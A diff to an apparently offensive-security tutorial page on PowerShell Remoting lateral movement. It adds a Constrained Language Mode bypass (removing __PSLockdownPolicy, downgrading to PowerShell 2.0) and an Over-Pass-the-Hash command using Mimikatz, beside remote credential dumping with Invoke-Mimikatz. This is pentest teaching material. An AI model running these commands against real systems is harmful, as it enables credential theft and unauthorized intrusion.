@@ -6,11 +6,13 @@ order: 2
 
 # PowerShell Remoting
 
-Onced a machine is compromised, we need to jump to others in order to find more valuable targets. For that task we can use `PowerShell Remoting` which is increasingly used in enterprises and enabled by default on Server 2012 onwards. PowerShell Remoting uses WinRM protocol, so you can check `evil-winrm` tool. Admin privileges on the target machineis needed.
+Once a machine is compromised, we need to jump to others in order to find more valuable targets. For that task we can use `PowerShell Remoting` which is increasingly used in enterprises and enabled by default on Server 2012 onwards. PowerShell Remoting uses WinRM protocol, so you can check `evil-winrm` tool. Admin privileges on the target machineis needed.
 
 > **Note**: Maybe you need to enable remoting `Enable-PSRemoting` on a Desktop windows machine and Admin privs are required.
 
-You can get a elevated shell (`NT/AUTHORITY SYSTEM`) on the remote server if the credentials of the user administrator are used to authenticate (default setting).
+You can get a elevated shell (`NT AUTHORITY\SYSTEM`) on the remote server if the credentials of the user administrator are used to authenticate (default setting).
+
+## Creating a Session
 
 There are two types of PowerShell Remoting:
 
@@ -39,11 +41,28 @@ Invoke-Command -ComputerName machine01.corp.local -FilePath .\file.ps1
 
 > **RedTeam Note**: Since admin privs are needed is a useful tool to check if the user has admin privs on the target machine.
 
+### PowerShell Constrained Language Mode ByPass
+
 By default PowerShell Remote run the script in a `ConstrainedLanguage` mode so we can not run some cmdlets which are considered to be unsafe. To check the type of language run the following command:
 
 ```powershell
 $ExecutionContext.SessionState.LanguageMode
 ```
+Enabling constrained language mode, that dows not allow powershell execute complex ataccks such as mimikatz.
+
+```powershell
+[Environment]::SetEnvironmentVariable(‘__PSLockdownPolicy‘, ‘4’, ‘Machine‘)
+```
+However, if you have access to the system and enough privileges to change environment variables, you can bypass it by removing the variable `__PSLockdownPolicy` and re-spawning another PowerShell instance.
+
+#### PowerShell Downgrade
+
+If PowerShell 2.0 is installed we can bypass it via spawning a PowerShell 2.0 instance.
+
+```powershell
+powershell -version 2
+```
+[https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass](https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass)
 
 ## Execute locally loaded funcitons on the remote machine
 
@@ -91,4 +110,12 @@ Or we can execute locally loaded functions.
 ```powershell
 . .\Invoke-Mimikatz.ps1
 Invoke-Command -Session $sess -ScriptBlock {function:Invoke-Mimikatz -DumpCreds}
+```
+
+# Over-Pass-the-Hash
+
+Abusing kerberos functionality we can execute commands as another user by only knowing the NTLM hash.
+
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::pth /usr:Administrator /domain:corp.local /ntlm:<ntlmhash> /run:powershell.exe"'
 ```
